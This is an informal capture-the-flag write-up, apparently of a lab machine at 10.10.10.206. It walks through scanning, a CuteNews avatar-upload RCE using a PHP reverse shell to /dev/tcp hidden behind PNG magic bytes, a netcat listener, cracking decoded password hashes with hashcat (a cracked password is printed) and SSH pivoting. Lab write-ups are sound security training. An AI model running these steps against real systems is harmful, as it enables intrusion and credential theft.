nmap -sV -sC -oA ./nmap 10.10.10.206
not much from the reusults, just port 22 and 80 running apache open

checking out the 10.10.10.206:80
PHP server, powered by CuteNews.
CuteNews is vulnerable to RCE and abitrary file upload vulnerability.

Can't use gobuster on this, the server detect and block our ip for a while

Found the CuteNews on the server @: 10.10.10.206/CuteNews/

Sign up for an account, upload an avatar => get RCE

create a php reverse shell with:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>

grab 20 magic bytes of a png file: head -c 20 test.png > magicbytes

Make a php shell with png signature: cat magicbytes shell.php > magicshell.php

Upload this file to the server without getting rejected: profit!!

We can see the uploaded files at: 10.10.10.206/CuteNews/uploads/

Set a listener: nc -lvnp 6969
Run the reverse shell on the server: 10.10.10.206/CuteNews/uploads/"shellname.php" <- server will change the shell name

we got shell!!

Playing around in the file directory, there is a file called "lines" at /var/www/html/CuteNews/cdata/users/,
containing a bunch of base64 strings. Decoded them -> seems like username and hashed password.

in /home/, we see paul and nadav
Lets crack paul password with hashcat -> password found: atlanta1
su paul -> escalated to paul -> user.txt flag pwned!

inside .ssh nadav@passage is seen in authorized_keys

Tried to ssh to nadav as paul: ssh nadav@10.10.10.206 -> we're in nadav too!
